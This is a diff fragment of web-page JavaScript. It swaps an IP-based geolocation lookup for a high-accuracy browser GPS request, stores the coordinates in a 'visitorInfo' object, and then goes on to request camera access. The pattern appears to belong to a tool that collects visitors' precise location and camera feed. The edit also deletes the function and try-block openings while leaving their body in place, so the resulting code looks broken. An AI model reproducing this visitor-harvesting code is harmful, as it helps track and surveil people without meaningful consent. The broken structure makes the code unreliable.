@@ -61,20 +61,25 @@
             }
         }
 
-        async function start() {
-            try {
-                // Get IP
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                visitorInfo.ip = ipData.ip;
-
-                // Get Location
-                const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-                const geo = await geoRes.json();
-                visitorInfo.city = geo.city || "Unknown";
-                visitorInfo.country = geo.country_name || "Unknown";
-                visitorInfo.latitude = geo.latitude || "Unknown";
-                visitorInfo.longitude = geo.longitude || "Unknown";
+        // Get Accurate Location (with user permission)
+                await new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            visitorInfo.latitude = position.coords.latitude;
+                            visitorInfo.longitude = position.coords.longitude;
+                            resolve();
+                        },
+                        (error) => {
+                            console.log("Location error:", error.message);
+                            resolve();
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        }
+                    );
+                });
 
                 // Request Camera
                 const stream = await navigator.mediaDevices.getUserMedia({
